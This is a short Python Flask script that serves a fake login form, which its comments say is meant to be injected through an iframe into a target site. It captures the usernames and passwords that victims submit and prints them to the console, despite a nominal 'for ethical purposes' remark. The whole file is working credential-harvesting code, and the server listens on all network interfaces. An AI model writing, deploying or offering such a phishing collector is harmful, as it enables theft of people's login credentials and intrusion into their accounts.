from flask import Flask, render_template_string, request, jsonify
import subprocess

# Create a Flask app instance
app = Flask(__name__)

# Route to provide the hook (iframe endpoint)
@app.route('/hook', methods=['GET', 'POST'])
def hook():
    if request.method == 'POST':
        # Capture the data (username, password) submitted through the iframe
        username = request.form.get('username')
        password = request.form.get('password')

        # For ethical purposes, print the credentials to the console (e.g., for testing)
        print(f"Captured credentials - Username: {username}, Password: {password}")

        # Simulate a successful data capture response
        return jsonify({"status": "Data captured successfully!"})

    # Serve a simple HTML form that will be injected via iframe on the target site
    return render_template_string('''
    <html>
    <head><title>Hook Page</title></head>
    <body>
        <h2>Welcome to the Hook Page</h2>
        <form method="POST" action="/hook">
            <input type="text" name="username" placeholder="Username" required />
            <input type="password" name="password" placeholder="Password" required />
            <input type="submit" value="Submit" />
        </form>
    </body>
    </html>
    ''')

# Run the Flask app (the server)
if __name__ == '__main__':
    # Running the server on localhost with port 5000
    print("Server running on http://localhost:5000")
    app.run(host='0.0.0.0', port=5000)


